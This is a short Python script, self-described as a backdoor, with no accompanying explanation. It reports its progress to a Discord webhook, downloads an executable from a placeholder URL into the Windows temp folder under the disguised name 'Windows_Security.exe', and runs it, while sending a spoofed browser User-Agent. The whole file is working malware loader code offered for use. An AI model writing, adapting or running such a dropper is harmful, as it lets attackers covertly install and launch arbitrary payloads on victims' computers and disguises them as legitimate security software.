import os, requests

api = 'DISCORD_WEBHOOK_URL'

def post_message(msg):
    requests.post(api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"{msg}"})

try:
    post_message('[+] Starting backdoor')
    temp = (os.getenv("temp"))


    '''
    Download File
    '''
    file = f'{temp}\\$~cache\\Windows_Security.exe'
    r = requests.get("DOWNLOAD_URL_HERE", allow_redirects=False)
    with open(file, 'wb') as f:
        f.write(r.content)
    f.close()

    '''
    Start File
    '''
    os.startfile(file)
    post_message('[+] Backdoor started successfully')

except Exception as e: 
    post_message(f'[-] Error: {e}')